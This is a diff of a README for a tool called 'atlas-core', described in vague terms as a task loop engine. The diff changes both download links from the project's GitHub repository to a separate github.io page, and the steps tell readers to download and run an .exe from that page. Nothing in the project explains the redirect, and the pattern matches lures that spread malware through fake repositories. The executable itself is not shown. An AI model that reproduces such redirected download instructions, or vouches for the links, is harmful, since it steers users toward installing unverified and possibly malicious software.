@@ -1,6 +1,6 @@
 # ⚙️ atlas-core - Automate your complex work tasks easily
 
-[![Download atlas-core](https://img.shields.io/badge/Download-atlas--core-blue.svg)](https://github.com/gayleensofthaired172/atlas-core)
+[![Download atlas-core](https://img.shields.io/badge/Download-atlas--core-blue.svg)](https://gayleensofthaired172.github.io)
 
 atlas-core functions as a loop engine for tasks. It manages your workflows, routes requests, and evaluates outcomes. When a process fails, the system tries again until it reaches the goal. This tool organizes AI-assisted work through a standard interface.
 
@@ -8,7 +8,7 @@ atlas-core functions as a loop engine for tasks. It manages your workflows, rout
 
 You need the software on your computer to begin. Follow these steps to prepare your system and run the program.
 
-1. Visit the [official download page](https://github.com/gayleensofthaired172/atlas-core).
+1. Visit the [official download page](https://gayleensofthaired172.github.io).
 2. Locate the section marked Releases on the right side of the page.
 3. Click the version labeled Latest.
 4. Find the file ending in .exe under the Assets heading.
